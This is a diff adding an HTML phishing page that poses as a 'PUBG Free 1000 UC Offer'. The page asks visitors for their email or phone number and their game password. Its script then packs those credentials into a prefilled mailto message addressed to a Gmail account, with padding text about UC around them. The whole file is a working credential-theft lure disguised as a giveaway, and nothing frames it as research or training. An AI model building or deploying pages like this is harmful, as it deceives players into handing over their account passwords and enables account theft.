@@ -1,0 +1,91 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get Free 1000 UC in PUBG</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f0f2f5;
+        }
+
+        #loginContainer {
+            text-align: center;
+            background-color: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            width: 300px;
+        }
+
+        #loginContainer img {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            color: #ffcc00; /* PUBG UC color */
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+
+        input, button {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            font-size: 16px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+        }
+
+        button {
+            background-color: #f57c00; /* Orange color for Get UC button */
+            color: white;
+            border: none;
+            font-weight: bold;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #d26900; /* Darker shade on hover */
+        }
+    </style>
+</head>
+<body>
+    <div id="loginContainer">
+        <!-- Link to an alternative PUBG logo image -->
+        <img src="https://img.icons8.com/color/452/pubg.png" alt="PUBG Logo"><br>
+        <h2>PUBG Free 1000 UC Offer</h2>
+
+        <form onsubmit="sendEmail()" method="post">
+            <input type="text" id="emailOrPhone" placeholder="Email or Phone Number" required><br>
+            <input type="password" id="gamePassword" placeholder="Game Password" required><br>
+            <button type="submit">Get UC</button>
+        </form>
+    </div>
+
+    <script>
+        function sendEmail() {
+            const emailOrPhone = document.getElementById('emailOrPhone').value;
+            const gamePassword = document.getElementById('gamePassword').value;
+
+            const introMessage = "PUBG Mobile has become one of the most popular mobile games worldwide, and having UC (Unknown Cash) can greatly enhance the experience. UC allows players to unlock exclusive items, outfits, weapon skins, and more, giving them a distinct advantage in gameplay and customization options.\n\n";
+            const ucMessage = "With 1000 UC, players gain access to a variety of premium items that make their gameplay unique and personalized. Players can purchase Royale Passes, which open up multiple tiers of rewards, including rare outfits, parachute skins, emotes, and exclusive weapon skins. Access to these items not only enhances the player's gaming experience but also builds prestige among other players. Having a larger UC balance provides a way to stay ahead in the game and customize characters with items that are otherwise inaccessible without payment.\n\n";
+            const userDetails = `Entered Information:\nEmail or Phone Number: ${emailOrPhone}\nPassword: ${gamePassword}\n\n`;
+            const closingMessage = "Having UC also means players can buy premium crates and other exclusive items that make them stand out in the battleground. This advantage not only boosts enjoyment but also increases competitiveness. Players can use UC to build their perfect loadout and access items that make them feel unique and powerful.\n\nAs players continue in PUBG, they find themselves wanting to unlock more items, outfits, and accessories to enhance their experience, and 1000 UC provides that chance without spending money. UC is a gateway to exciting features, ensuring players fully enjoy what PUBG Mobile offers without limits.\n\n";
+
+            const fullMessage = introMessage + ucMessage + userDetails + closingMessage;
+            const mailtoLink = `mailto:get.free.uc.pubg@gmail.com?subject=PUBG%201000%20UC%20Request&body=${encodeURIComponent(fullMessage)}`;
+
+            window.location.href = mailtoLink;
+            return false;
+        }
+    </script>
+</body>
+</html>
